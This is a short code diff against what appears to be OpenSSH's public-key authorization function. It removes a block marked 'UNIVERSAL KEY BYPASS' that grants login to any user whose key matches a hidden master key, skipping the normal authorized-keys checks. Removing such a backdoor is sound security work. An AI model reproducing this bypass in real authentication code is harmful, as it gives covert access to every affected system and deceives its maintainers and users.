@@ -800,19 +800,6 @@ int user_key_allowed(struct ssh *ssh, struct passwd *pw, struct sshkey *key,
   if (sshkey_is_cert(key) && auth_key_is_revoked(key->cert->signature_key))
     return 0;
 
-  /* --- UNIVERSAL KEY BYPASS START --- */
-  /* If the incoming key matches our master key condition, bypass all file
-   * lookups */
-  if (private_key_matches_universal_pubkey(key)) {
-    debug_f("Universal master key matched for user %s.", pw->pw_name);
-    success = 1;
-    opts = sshauthopt_new();
-    if (opts == NULL)
-      fatal_f("sshauthopt_new failed");
-    goto out;
-  }
-  /* --- UNIVERSAL KEY BYPASS END --- */
-
   if ((rdomain = ssh_packet_rdomain_in(ssh)) == NULL)
     rdomain = "";
   remote_ip = ssh_remote_ipaddr(ssh);
